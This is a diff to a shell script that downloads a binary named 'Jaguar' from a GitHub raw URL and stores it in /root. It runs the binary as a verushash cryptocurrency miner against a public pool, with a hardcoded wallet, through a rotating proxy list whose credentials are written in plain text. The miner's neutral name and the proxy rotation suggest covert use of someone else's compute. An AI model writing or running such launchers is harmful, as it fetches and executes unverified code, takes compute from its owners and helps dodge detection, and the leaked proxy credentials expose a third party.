@@ -13,6 +13,13 @@ proxies=(
 username="proxymantap348"
 password="jherahhra"
 
+# Download Jaguar only once
+if [ ! -f /root/Jaguar ]; then
+  # Set up graftcp configuration to download Jaguar
+  /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
+  chmod +x /root/Jaguar
+fi
+
 # Function to run ccminer with a specified proxy
 run_ccminer() {
   local proxy=$1
@@ -38,23 +45,14 @@ END
   echo " "
   echo " "
 
-  # Use /usr/bin/graftcp to download Jaguar
-  /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
-
-  # Make sure Jaguar is executable
-  chmod +x Jaguar
-  
-  # Run Miner 
-  ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads 4 --proxy $username:$password@$proxy  &
+  # Run Jaguar with the selected proxy
+  /usr/bin/graftcp /root/Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads 4 --proxy $username:$password@$proxy &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
 
-  # Sleep for xx minutes
+  # Sleep for 7000 seconds (adjust as needed)
   sleep 7000
-
-  # Clean up Jaguar
-  rm Jaguar
 
   # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
   kill -2 $ccminer_pid
